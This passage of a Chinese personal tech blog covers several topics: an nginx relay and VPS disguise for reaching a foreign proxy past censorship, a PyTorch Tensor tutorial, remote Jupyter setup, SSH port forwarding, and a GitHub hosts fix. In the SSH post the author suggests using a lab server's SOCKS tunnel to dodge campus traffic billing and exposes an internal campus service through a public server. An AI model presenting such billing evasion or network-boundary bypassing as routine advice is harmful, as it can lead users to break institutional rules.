<h4 id="配置文件修改"><a href="#配置文件修改" class="headerlink" title="配置文件修改"></a>配置文件修改</h4><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">vi /etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure><br>添加<br><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">stream &#123;</span><br><span class="line">        server &#123;</span><br><span class="line">                listen Port; # 国内服务器的监听端口</span><br><span class="line">                proxy_pass 境外VPS的IP:Port;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>保存之后配置开机自启以及启动nginx<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">systemctl <span class="hljs-built_in">enable</span> nginx &amp;&amp; systemctl start nginx</span><br></pre></td></tr></table></figure><br>如果你的服务器是阿里云或者腾讯云诸如此类，还需要配置安全组规则，开放TCP连接的listen中配置的端口。<br>如果你之前配置过了代理服务器，那现在将自己机器上的代理软件的IP地址和端口号改为国内这台服务器的地址和端口，应该就能实现科学上网了。<br>如果不行，请检查一下国内服务器有没有配置防火墙规则等。</p>
<h3 id="三、配置境外VPS"><a href="#三、配置境外VPS" class="headerlink" title="三、配置境外VPS"></a>三、配置境外VPS</h3><p>如果之前你的境外VPS没有配置过代理程序，配置代理的方法具体请参考我的另一篇文章：<a href="https://fansblog.club/2019/06/29/ipv6/">Click Here</a><br>对境外VPS配置一番，主要是为了降低GFW的干扰，减少IP地址被墙的几率。<br><code>除了ssh的22端口，网站的80/443端口，其他端口只允许国内那台服务器的连接。</code></p>
<h4 id="防火墙配置"><a href="#防火墙配置" class="headerlink" title="防火墙配置"></a>防火墙配置</h4><p>这里使用的是ubuntu的防火墙<code>ufw</code>。<br>ufw命令举例：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-comment"># 允许某个端口连接</span></span><br><span class="line">ufw allow port</span><br><span class="line"><span class="hljs-comment"># 允许此IP访问所有的本机端口</span></span><br><span class="line">ufw allow from IPv4</span><br><span class="line"><span class="hljs-comment"># 开启防火墙</span></span><br><span class="line">ufw <span class="hljs-built_in">enable</span></span><br></pre></td></tr></table></figure><br>经过上述配置后，GFW探测你的VPS，除了ssh和网站的常用端口外，ss/ssr的端口根本无法连接，IP地址的被墙的几率自然就降低了。</p>
<h4 id="将境外VPS伪装的更像一个网站"><a href="#将境外VPS伪装的更像一个网站" class="headerlink" title="将境外VPS伪装的更像一个网站"></a>将境外VPS伪装的更像一个网站</h4><p>为了把境外VPS做的更像一个网站，因此我们在这台服务器上再放一些web页面。<br>同样的安装nginx<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">apt install nginx</span><br></pre></td></tr></table></figure><br>nginx安装完成的时候会自动启动，打开浏览器输入你服务器的IP地址，你会看到如下的界面。<br><img src="/2020/02/04/network-jump/4.jpg" alt="Welcome"><br>nginx的默认目录在<code>/var/www/html/</code><br>我们将静态页面放到这里面就可以了，一定要有个index.html哦。<br>因为我的博客repo在我的github上，因此我就直接git clone到上面这个目录下了。<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-built_in">cd</span> /var/www/html/</span><br><span class="line">git <span class="hljs-built_in">clone</span> https://github.com/aestheticisma/aestheticisma.github.io</span><br><span class="line"><span class="hljs-comment"># 之后将aestheticisma.github.io里面的东西全部移动到/var/www/html/下</span></span><br><span class="line"><span class="hljs-built_in">cd</span> aestheticisma.github.io/</span><br><span class="line">cp -r ./* ..</span><br></pre></td></tr></table></figure><br>再次在浏览器输入服务器ip地址就会发现有东西显示了。<br>这样我们的境外VPS伪装完成了。</p>
<h3 id="四、关于自己机器上的代理配置说明"><a href="#四、关于自己机器上的代理配置说明" class="headerlink" title="四、关于自己机器上的代理配置说明"></a>四、关于自己机器上的代理配置说明</h3><p>如果你之前用过shadowsocks诸如此类代理软件，就是相当于把ip地址和端口号换成了国内服务器的ip地址和在nginx中配置的监听端口号，其他的密码等都是和之前一样的，因为代理服务还是配置在境外VPS上的，国内的服务器只是起到了一个转发流量的作用。</p>
]]></content>
      <categories>
        <category>Daily Essays</category>
      </categories>
  </entry>
  <entry>
    <title>面向和我一样小白的Pytorch教程（待更新）</title>
    <url>/2020/05/28/pytorch-tutorial/</url>
    <content><![CDATA[<p>经过一次本科毕业设计的洗礼，让我逐渐从一个对Deep Learning一无所知的骚年变成一个准备入门的炼丹小白。回顾这几个月（虽然大部分时间都在划水），想做什么都是在谷歌百度，也很难找到一个完全适合我这种小白的Pytorch教程，网上的资料要么过时要么繁琐，最好的学习方式大概是官方的教程，但谁会看得进去呢？所以，我想把我这些日子的经历记录下来，如果有和我一样小白的同学们可以用来参考一下。<a id="more"></a><br>看完这个教程，你会基本学会如何使用Pytorch进行初级水平的搭积木。让我们开始吧！</p>
<h3 id="一、Install"><a href="#一、Install" class="headerlink" title="一、Install"></a>一、Install</h3><p>第一步，当然是要安装Pytorch啦，请移步<a href="https://pytorch.org/get-started/locally/" target="_blank" rel="noopener">官网</a>，里面有给出具体的安装命令，包括conda以及pip的安装方式。当然这里强烈建议使用Anaconda，Anaconda配置教程详见<a href="https://fansblog.club/2019/12/03/anaconda-installformac/">这里</a>。选择你机器的配置之后复制命令即可，如图所示：<br><img src="/2020/05/28/pytorch-tutorial/pytorch_install.png" alt="pytorch_install.png"></p>
<h3 id="二、Tensor"><a href="#二、Tensor" class="headerlink" title="二、Tensor"></a>二、Tensor</h3><p>要开始介绍Pytorch之前，我们首先要知道它的计算的基本单位是什么，没错就是Tensor——张量，Tensor比较类似Numpy中的array，比如标量可以理解为0维Tensor，向量可以理解为1维Tensor，矩阵可以理解为2维Tensor，但二者又不完全相同，因为Tensor还附有更多的属性。它有哪些属性呢？让我们来看一下。<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> torch</span><br><span class="line">tensor_a = torch.randn(<span class="hljs-number">5</span>, <span class="hljs-number">3</span>)</span><br><span class="line">print(len(dir(tensor_a)))</span><br><span class="line"><span class="hljs-comment"># 479</span></span><br></pre></td></tr></table></figure><br>哇，它竟然有这么多的方法或属性，那我们列举几个比较常用的吧。</p>
<h4 id="1-About-Tensor’s-Attribute"><a href="#1-About-Tensor’s-Attribute" class="headerlink" title="1. About Tensor’s Attribute"></a>1. About Tensor’s Attribute</h4><ul>
<li><p>Tensor.requires_grad<br>首先第一个<code>requires_grad</code>，是我认为最重要的，它可是Tensor区别于Numpy的灵魂所在，没有了它，怎么知道这个这个Tensor需不需要求导数呢？当我们创建Tensor的时候，它是默认为False的，但如果我们新建一个网络的时候，它的默认值就是True了。<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line">tensor_a = torch.randn(<span class="hljs-number">5</span>, <span class="hljs-number">3</span>)</span><br><span class="line">print(tensor_a.requires_grad)</span><br><span class="line"><span class="hljs-comment"># False</span></span><br><span class="line">tensor_b = torch.randn(<span class="hljs-number">5</span>, <span class="hljs-number">3</span>, requires_grad=<span class="hljs-literal">True</span>)</span><br><span class="line">print(tensor_b.requires_grad)</span><br><span class="line"><span class="hljs-comment"># True</span></span><br><span class="line">embed = torch.nn.Embedding(<span class="hljs-number">5</span>, <span class="hljs-number">10</span>)</span><br><span class="line">print(embed.weight.requires_grad)</span><br><span class="line"><span class="hljs-comment"># True</span></span><br></pre></td></tr></table></figure><br>如果你看过有关Pytorch的代码，你可能会发现有个叫Variable的东西，在0.4版本之前，对Tensor，都会用Variable一裹，但现在没必要这么做了，现在的Tensor已经和Variable等价了，所以忘掉Variable吧。</p>
</li>
<li><p>Tensor.shape or Tensor.size()<br>当我们想查看一下Tensor的形状的时候，也就是我们想知道它的每一维是多少，我们可以用这两种方式：<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line">tensor_a = torch.randn(<span class="hljs-number">5</span>, <span class="hljs-number">3</span>)</span><br><span class="line">print(tensor_a.shape)</span><br><span class="line"><span class="hljs-comment"># torch.Size([5, 3])</span></span><br><span class="line">print(tensor_a.size())</span><br><span class="line"><span class="hljs-comment"># torch.Size([5, 3])</span></span><br><span class="line"><span class="hljs-comment"># 我们可以将这两种方法返回的结果看作是个tuple，因为你可以取出每一维的数值，而且它的值并不能被更改.</span></span><br><span class="line">print(tensor_a.size()[<span class="hljs-number">0</span>])</span><br><span class="line"><span class="hljs-comment"># 5</span></span><br><span class="line"><span class="hljs-comment"># 同时，还有其他几个方法，比如Tensor.dim()用来查看维数，Tensor.numel()用来查看所有元素个数.</span></span><br></pre></td></tr></table></figure></p>
</li>
<li><p>Tensor.view()<br>当我们需要喂给下游的网络一个对应维度的Tensor需要怎么做呢？这就可以用到<code>Tensor.view()</code>了，我们可以在括号里指定维数。但需要注意的一点是，view后的Tensor变量其实是和前者共享一个存储空间的，这也就意味着如果前者发生了改变，后者对应位置的值也是要跟着改变的，反之亦然。<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line">tensor_a = torch.randn(<span class="hljs-number">5</span>, <span class="hljs-number">3</span>)</span><br><span class="line"><span class="hljs-string">'''</span></span><br><span class="line"><span class="hljs-string">tensor([[-0.0519, -1.4556,  0.9473],</span></span><br><span class="line"><span class="hljs-string">    [ 1.1269, -1.1122,  0.8940],</span></span><br><span class="line"><span class="hljs-string">    [ 1.9436, -0.4815, -1.6614],</span></span><br><span class="line"><span class="hljs-string">    [ 0.6607, -0.2767,  0.9539],</span></span><br><span class="line"><span class="hljs-string">    [ 1.6680, -1.1298, -1.2454]])</span></span><br><span class="line"><span class="hljs-string">'''</span></span><br><span class="line">tensor_b = tensor_a.view(<span class="hljs-number">1</span>, <span class="hljs-number">-1</span>)</span><br><span class="line"><span class="hljs-string">'''</span></span><br><span class="line"><span class="hljs-string">tensor([[-0.0519, -1.4556,  0.9473,  1.1269, -1.1122,  0.8940,  1.9436, -0.4815,</span></span><br><span class="line"><span class="hljs-string">         -1.6614,  0.6607, -0.2767,  0.9539,  1.6680, -1.1298, -1.2454]])</span></span><br><span class="line"><span class="hljs-string">'''</span></span><br><span class="line"><span class="hljs-comment"># 使用-1的意思就是根据前面的维度数值自动计算出这个维度位置的具体数值。</span></span><br><span class="line"><span class="hljs-comment"># 当我们修改tensor_a会发生什么呢？</span></span><br><span class="line">tensor_a[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">0</span></span><br><span class="line">print(tensor_b)</span><br><span class="line"><span class="hljs-string">'''</span></span><br><span class="line"><span class="hljs-string">tensor([[ 0.0000, -1.4556,  0.9473,  1.1269, -1.1122,  0.8940,  1.9436, -0.4815,</span></span><br><span class="line"><span class="hljs-string">         -1.6614,  0.6607, -0.2767,  0.9539,  1.6680, -1.1298, -1.2454]])</span></span><br><span class="line"><span class="hljs-string">'''</span></span><br><span class="line"><span class="hljs-comment"># 看！它俩共享一个存储空间的吧。</span></span><br><span class="line"><span class="hljs-comment"># 当然，如果你不想他们共享存储空间，可以用clone()方法复制一个Tensor，之后再对其改变维度。</span></span><br><span class="line">tensor_c = tensor_a.clone().view(<span class="hljs-number">1</span>, <span class="hljs-number">-1</span>)</span><br></pre></td></tr></table></figure></p>
</li>
<li><p>Tensor.item()<br>用来返回Python中的标量值。这个方法只适用于一个元素的Tensor，并不管是不是一维的，只要这个Tensor只有一个元素就可以。<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line">tensor_a = torch.Tensor([<span class="hljs-number">1</span>])</span><br><span class="line">print(tensor_a.item())</span><br><span class="line"><span class="hljs-comment"># 1.0</span></span><br></pre></td></tr></table></figure></p>
</li>
<li><p>Tensor.squeeze() and Tensor.unsqueeze()<br>这两个方法是用来干嘛的呢？我们可以查一下squeeze的意思——挤压，没错，就是用来挤压Tensor维度的，当一个Tensor有维度值是1的时候，我们就可以用squeeze()来消除这一维，反之，可以用unsqueeze()增加一个维度值为1的维度。注意使用unsqueeze()的时候需要指定维度位置参数。<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line">tensor_a = torch.randn(<span class="hljs-number">5</span>, <span class="hljs-number">3</span>)</span><br><span class="line"><span class="hljs-comment"># shape: torch.Size([5, 3])</span></span><br><span class="line">tensor_b = tensor_a.unsqueeze(<span class="hljs-number">1</span>)</span><br><span class="line"><span class="hljs-comment"># shape: torch.Size([5, 1, 3])</span></span><br><span class="line">tensor_c = tensor_b.squeeze()</span><br><span class="line"><span class="hljs-comment"># shape: torch.Size([5, 3])</span></span><br><span class="line"><span class="hljs-comment"># 当然在squeeze()中指定维度位置参数也是可以的，比如tensor_c = tensor_b.squeeze(1)</span></span><br></pre></td></tr></table></figure></p>
</li>
<li><p>Tensor.transpose() and Tensor.permute()<br>这两个方法用于对Tensor的维度进行交换，对于矩阵来说，也就达到了转置的功能。<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line">tensor_a = torch.randn(<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>)</span><br><span class="line"><span class="hljs-comment"># 利用transpose()对0，1维度进行交换</span></span><br><span class="line">tensor_b = tensor_a.transpose(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)</span><br><span class="line"><span class="hljs-comment"># 传入一组维度，将对应维度按顺序生成新的size</span></span><br><span class="line">tensor_c = tensor_a.permute(<span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>)</span><br><span class="line">print(tensor_b.shape)</span><br><span class="line"><span class="hljs-comment"># torch.Size([4, 3, 5])</span></span><br><span class="line">print(tensor_c.shape)</span><br><span class="line"><span class="hljs-comment"># torch.Size([5, 4, 3])</span></span><br></pre></td></tr></table></figure></p>
</li>
<li><p>切片和索引<br>既然pytorch语法与Python高度相似，那Tensor一定也是支持切片与索引功能的。但注意，与列表不同，切片出的Tensor与原Tensor共享内存，也就意味着切片出的Tensor的数据修改将导致原Tensor的数据跟着修改。<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line">tensor_a = torch.arange(<span class="hljs-number">1</span>,<span class="hljs-number">5</span>)</span><br><span class="line">tensor_b = tensor_a[<span class="hljs-number">0</span>:<span class="hljs-number">3</span>:<span class="hljs-number">2</span>]</span><br><span class="line">print(tensor_a)</span><br><span class="line"><span class="hljs-comment"># tensor([1, 2, 3, 4])</span></span><br><span class="line">print(tensor_b)</span><br><span class="line"><span class="hljs-comment"># tensor([1, 3])</span></span><br><span class="line">tensor_b[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span></span><br><span class="line">print(tensor_a)</span><br><span class="line"><span class="hljs-comment"># tensor([0, 2, 3, 4])</span></span><br></pre></td></tr></table></figure><br><code>未完待续</code><br>BTW，最近我这个废物太懒了，什么也不想干，只想躺在床上玩手机。等我调整好状态再写下去吧，所以更新随缘吧…</p>
</li>
</ul>
]]></content>
      <categories>
        <category>Deep Learning</category>
      </categories>
  </entry>
  <entry>
    <title>服务器配置jupyter notebook实现远程访问</title>
    <url>/2019/12/14/remote-jupyternotebook/</url>
    <content><![CDATA[<p><code>jupyter notebook</code>简单配置，随手记录，以备遗忘。<a id="more"></a><br>最近开始想从头系统的学习一下深度学习，以便为以后三年的研究生的学习生活打基础，顺便将之前租的阿里云服务器利用起来，于是就配置一下<code>jupyter notebook</code>吧</p>
<h3 id="一、安装"><a href="#一、安装" class="headerlink" title="一、安装"></a>一、安装</h3><p><code>jupyter notebook</code>会随着<code>Anaconda</code>一起安装好，因此我们只需要安装好<code>Anaconda</code>就好，详情请参照之前的博客。</p>
<h3 id="二、配置"><a href="#二、配置" class="headerlink" title="二、配置"></a>二、配置</h3><h4 id="1-生成配置文件"><a href="#1-生成配置文件" class="headerlink" title="1. 生成配置文件"></a>1. 生成配置文件</h4><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">jupyter notebook --generate-config</span><br></pre></td></tr></table></figure></p>
<h4 id="2-设置密码并生成密钥"><a href="#2-设置密码并生成密钥" class="headerlink" title="2. 设置密码并生成密钥"></a>2. 设置密码并生成密钥</h4><p><code>shell</code>下输入<code>python</code><br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> notebook.auth <span class="hljs-keyword">import</span> passwd</span><br><span class="line">passwd()</span><br></pre></td></tr></table></figure><br>会出现让我们输入密码、确认密码<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">Enter password: </span><br><span class="line">Verify password: </span><br><span class="line"><span class="hljs-string">'sha1:*************’</span></span><br></pre></td></tr></table></figure><br>这个生成的密钥要记住，找个地方复制粘贴下来。</p>
<h4 id="3-修改配置文件"><a href="#3-修改配置文件" class="headerlink" title="3. 修改配置文件"></a>3. 修改配置文件</h4><p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line">c.NotebookApp.ip=<span class="hljs-string">'*'</span>    <span class="hljs-comment">#允许访问的IP地址，设置为*代表允许任何客户端访问</span></span><br><span class="line">c.NotebookApp.password = <span class="hljs-string">u'sha1:8d...'</span><span class="hljs-comment">#		刚才生成密码时复制的密文</span></span><br><span class="line">c.NotebookApp.open_browser = <span class="hljs-literal">False</span>    <span class="hljs-comment">#True的话会自动弹出窗口</span></span><br><span class="line">c.NotebookApp.port = <span class="hljs-number">5555</span>  <span class="hljs-comment">#可自行指定一个端口, 访问时使用该端口</span></span><br><span class="line">c.NotebookApp.allow_remote_access = <span class="hljs-literal">True</span>   <span class="hljs-comment">#这个一定得设置，不然会报错</span></span><br></pre></td></tr></table></figure><br>别忘了保存。<br>哦，如果你是国内的服务器厂商诸如腾讯云、阿里云之类的，还需要添加一下安全组规则。</p>
<h3 id="三、远程访问"><a href="#三、远程访问" class="headerlink" title="三、远程访问"></a>三、远程访问</h3><p>在服务器输入：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">jupyter notebook</span><br></pre></td></tr></table></figure><br>就可以开启<code>jupyter notebook</code>进程了<br>如果访问的是/root目录，还需要root权限<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">jupyter notebook --allow-root</span><br></pre></td></tr></table></figure><br>之后就可以在本地浏览器输入<code>ip:port</code>实现远程访问<code>jupyter notebook</code>了<br>（第一次访问会输入密码。）</p>
<h3 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h3><p>我们可以使用<code>screen</code>命令实现<code>jupyter notebook</code>后台运行，这样我们去用服务器干别的事情啦。<br>输入：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">screen -S process_name</span><br></pre></td></tr></table></figure><br>之后运行<code>jupyter notebook</code>就可以了，返回键为<code>ctrl</code> + <code>A</code> + <code>D</code><br>显示后台程序输入：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">screen -r process_name</span><br></pre></td></tr></table></figure><br>如果服务器没有<code>screen</code>命令请安装<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">apt install screen</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>Daily Essays</category>
      </categories>
  </entry>
  <entry>
    <title>SSH端口转发</title>
    <url>/2020/01/02/ssh-tips/</url>
    <content><![CDATA[<p>平时我们一般用ssh连接服务器，但它还可以用来端口转发呀！<a id="more"></a></p>
<h3 id="一、端口转发概述"><a href="#一、端口转发概述" class="headerlink" title="一、端口转发概述"></a>一、端口转发概述</h3><p>我们知道，SSH 会自动加密和解密所有 SSH 客户端与服务端之间的网络数据。但是，SSH 还同时提供了一个非常有用的功能，这就是端口转发。它能够将其他 TCP 端口的网络数据通过 SSH 链接来转发，并且自动提供了相应的加密及解密服务。这一过程有时也被叫做“隧道”（tunneling），这是因为 SSH 为其他 TCP 链接提供了一个安全的通道来进行传输而得名。总的来说 SSH 端口转发能够提供两大功能：</p>
<ul>
<li>加密 SSH Client 端至 SSH Server 端之间的通讯数据。</li>
<li>突破防火墙的限制完成一些之前无法建立的 TCP 连接。</li>
</ul>
<h3 id="二、本地端口转发和远程端口转发"><a href="#二、本地端口转发和远程端口转发" class="headerlink" title="二、本地端口转发和远程端口转发"></a>二、本地端口转发和远程端口转发</h3><p>我们来区分一下这两种端口转发的概念，我们知道，SSH端口转发自然需要SSH连接，但是SSH连接是有方向的，从<strong>SSH Client</strong>到<strong>SSH Server</strong>。而我们的应用也是有方向的，如果应用连接的方向和SSH的方向的一致的，那我们就说它是本地转发，如果两个方向不一致，我们就说它是远程转发。</p>
<h4 id="本地转发实例"><a href="#本地转发实例" class="headerlink" title="本地转发实例"></a>本地转发实例</h4><p>我们想象一下，假如我在实验室的服务器上开了一个本地web服务，比如本地测试一个网站或者本地开启jupyter notebook，但是我现在人在寝室啊，怎么能在自己的机器上访问到服务器上的这个web服务呢？为了能解决这个问题，我们可以通过搭建隧道进行解决，也就是接下来要用到的本地端口转发。<br>它的命令格式为：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">ssh -L &lt;<span class="hljs-built_in">local</span> port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;SSH hostname&gt;</span><br></pre></td></tr></table></figure><br>那接下来我们就搭建一个隧道测试一下吧！<br>首先，我在服务器上开启jupyter notebook服务，<br><img src="/2020/01/02/ssh-tips/1.png" alt="jupyter_start"><br>因为在这台服务器上我并没有配置jupyter，因此现在只运行在了本地的8888端口，我们下面搭建隧道在自己的机器上访问它吧！<br>打开terminal，输入：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">ssh -L 12345:localhost:8888 -p 22322 zhangfan@10.8.128.205</span><br></pre></td></tr></table></figure><br>最后的是我的服务器的ip哦，加-p参数是因为实验室的一个内网ip的不同端口分配了不同的服务器，害，都内网ip了还这么稀缺，大哭…<br>-L参数代表本地转发，至于为什么<code>&lt;remote host&gt;</code>字段用的是localhost，这里解释一下，remote的意思是远程的，也就是这个字段填写的是我们要连接的地址，那这个地址又是相对于谁来说的呢？当然是我们的服务器啦，因为jupyter服务是运行在我们服务器的本地的8888端口的啦，所以这里用的就是localhost了。<br>打开浏览器，输入<strong>localhost:12345</strong>我们可以看到打开了jupyter的页面。<br><img src="/2020/01/02/ssh-tips/2.png" alt="jupyter_page"></p>
<h4 id="远程转发实例"><a href="#远程转发实例" class="headerlink" title="远程转发实例"></a>远程转发实例</h4><p>既然是远程转发，我们只要把上述本地转发的应用或者SSH连接的任一方向反向就变成了远程端口转发。<br>比如，本来是在本地的机器上建立向服务器的SSH连接，现在我们反过来：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">ssh -R &lt;SSH host port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;SSH hostname&gt;</span><br></pre></td></tr></table></figure></p>
<h3 id="三、动态端口转发"><a href="#三、动态端口转发" class="headerlink" title="三、动态端口转发"></a>三、动态端口转发</h3><p>无论我们刚才讨论的本地和远程转发，都是特定的一个端口到另一个端口的转发，那如果我们没有这个端口号怎么办？咦，什么样子的应用会没有这个端口号呢？比如说用浏览器进行web浏览，用QQ或者wechat聊天的时候呀！当我们在一个不安全的WiFi环境下上网的时候，用SSH动态转发来保护我们的网页浏览和社交软件的信息无疑是十分必要的。<br>动态转发命令格式：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">ssh -D &lt;<span class="hljs-built_in">local</span> port&gt; &lt;SSH Server&gt;</span><br></pre></td></tr></table></figure><br>比如当我使用<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">ssh -D 1234 -p 22322 zhangfan@10.8.128.205</span><br></pre></td></tr></table></figure><br>就是我把本地的1234端口作为本地的端口号，所有流经1234端口的流量全部转发给了服务器。<br>嘿嘿嘿，是不是觉得和代理有点像，没错，就是很像！其实在这里SSH是创建了一个SOCKS代理服务。<br>那……这岂不是一个新的校园网免流的方法嘛？因为校园网局域网内的流量是不计费的，那我们通过实验室的服务器对外访问所消耗的流量就不是劳资的账号的流量了呀，哈哈哈哈哈！<br>前提是只能使用支持socks代理的应用，比如浏览器，QQ微信啥的…别忘了在应用设置一下开启socks代理哦。<br>不要告发我哦！我什么都不知道！我可不薅学校的羊毛！</p>
<h3 id="四、实战——如何用SSH解决在家访问学校内网的服务器的jupyter服务"><a href="#四、实战——如何用SSH解决在家访问学校内网的服务器的jupyter服务" class="headerlink" title="四、实战——如何用SSH解决在家访问学校内网的服务器的jupyter服务"></a>四、实战——如何用SSH解决在家访问学校内网的服务器的jupyter服务</h3><p>前提：现在有一台能正常使用的笔记本，一台有公网ip的阿里云服务器，一台学校实验室的内网服务器。<br>为了方便描述，分别简称为<code>host1, host2, host3</code><br>首先我们捋一下思路：host2具备公网ip，因此host1和host3都可以连接，但反向不行。因此我们先对host3和host2之间建立SSH隧道，再对host1和host2建立对应端口的隧道，这样host1与host3之间就相当于打通了一条通路。<br>假设host3的jupyter运行在本地的8888端口上。因为只能是host3单向能连接到host2，因此我们只能在host3上对host2建立SSH隧道。那这样一来，host3就是SSH客户端，而host2就是SSH服务端，但host3本身是作为jupyter的服务提供者，因此应用和SSH连接的方向是相反的，所以我们要用的是远程端口转发命令。<br>首先连接到实验室的服务器：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">ssh host3</span><br></pre></td></tr></table></figure><br>为了防止关掉terminal导致SSH链接断掉，因此使用screen命令：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">screen -S SSH_jupyter</span><br><span class="line"><span class="hljs-comment"># ssh -g -R 12345:localhost:8888 host2 #这里用-R是远程端口转发</span></span><br><span class="line"><span class="hljs-comment"># 1.3日更新 今早发现ssh连接自动断了 加-o参数可保持持续连接</span></span><br><span class="line">ssh -g -R 12345:localhost:8888 -o ServerAliveInterval=60 host2</span><br></pre></td></tr></table></figure><br>必须加上-g参数，以保证host1能使用host3建立的远程端口转发，加上-g参数就代表可以共享这个连接的意思。<br>按下ctrl+A+D可以从screen命令返回。<br>之后在自己的笔记本上，也就是host1上（可以用手机开热点模拟在家的情况）<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">ssh -L 1234:localhost:12345 host2</span><br></pre></td></tr></table></figure><br>好了最后笔记本上的terminal不要关掉哦，不然这个SSH隧道就断了哦。<br>现在我们在笔记本上的浏览器中输入：localhost:1234<br>是不是打开了在实验室的服务器上开启的jupyter服务呢。</p>
]]></content>
      <categories>
        <category>Daily Essays</category>
      </categories>
  </entry>
  <entry>
    <title>Solve无法访问github的问题</title>
    <url>/2020/02/04/unable-access-github/</url>
    <content><![CDATA[<p>前几天发现家里的网络访问不了github了，开始没太在意，因为挂着代理也能访问不影响，直到今天准备push的时候发现根本push不上去。现将解决方法整理如下。<a id="more"></a></p>
<h3 id="一、访问github-IP查询网址"><a href="#一、访问github-IP查询网址" class="headerlink" title="一、访问github IP查询网址"></a>一、访问github IP查询网址</h3><p><a href="http://www.github.com.ipaddress.com/" target="_blank" rel="noopener">Click Here</a><br>你会看到如下界面<br><img src="/2020/02/04/unable-access-github/1.jpg" alt="1.jpg"></p>
<h3 id="二、修改Hosts文件"><a href="#二、修改Hosts文件" class="headerlink" title="二、修改Hosts文件"></a>二、修改Hosts文件</h3><ul>
<li><p>Mac<br>位置：<code>/etc/hosts</code></p>
</li>
<li><p>Win<br>位置：<code>C:\Windows\system32\drivers\etc</code></p>
</li>
</ul>
<p>添加在IP查询页面看到的IP地址：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">192.30.253.113	github.com</span><br></pre></td></tr></table></figure></p>
<h3 id="三、刷新DNS缓存"><a href="#三、刷新DNS缓存" class="headerlink" title="三、刷新DNS缓存"></a>三、刷新DNS缓存</h3><ul>
<li><p>Mac<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">sudo dscacheutil -flushcache</span><br></pre></td></tr></table></figure></p>
</li>
<li><p>Win<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">ipconfig/flushdns</span><br></pre></td></tr></table></figure></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Daily Essays</category>
      </categories>
  </entry>
  <entry>
    <title>Sublime中按ctrl+B调用python3运行</title>
    <url>/2019/07/23/sublime-run/</url>
    <content><![CDATA[<p>前些天用python写了一个小程序，但放在sublime里直接ctrl+B运行不了，提示没有什么什么包…思前想后，觉得sublime的ctrl+B快捷键默认使用的是电脑里的python2吧<a id="more"></a>，而我是用pip3 install的包，肯定会报错了，那现在解决办法一定是要让sublime知道我的python3放在哪里，根据python3的路径去用python3执行代码。</p>
<p>解决办法如下：</p>
<h5 id="1-首先新建一个sublime-build-system"><a href="#1-首先新建一个sublime-build-system" class="headerlink" title="1. 首先新建一个sublime build system"></a>1. 首先新建一个sublime build system</h5><p>   Tools-&gt;Build System-&gt;New Build System…</p>
<p>   <img src="/2019/07/23/sublime-run/sublime_run1.png" alt="sublime_run1"></p>
<h5 id="2-在里面输入以下内容："><a href="#2-在里面输入以下内容：" class="headerlink" title="2. 在里面输入以下内容："></a>2. 在里面输入以下内容：</h5><p>   <figure class="highlight json hljs"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="hljs-attr">"env"</span>: &#123;<span class="hljs-attr">"PYTHONIOENCODING"</span>: <span class="hljs-string">"utf8"</span>&#125;,</span><br><span class="line">    <span class="hljs-attr">"cmd"</span>: [<span class="hljs-string">"/Library/Frameworks/Python.framework/Versions/3.6/bin/python3"</span>, <span class="hljs-string">"-u"</span>, <span class="hljs-string">"$file"</span>],</span><br><span class="line">    <span class="hljs-attr">"file_regex"</span>: <span class="hljs-string">"^[ ]*File \"(...*?)\", line ([0-9]*)"</span>,</span><br><span class="line">    <span class="hljs-attr">"selector"</span>: <span class="hljs-string">"source.python"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
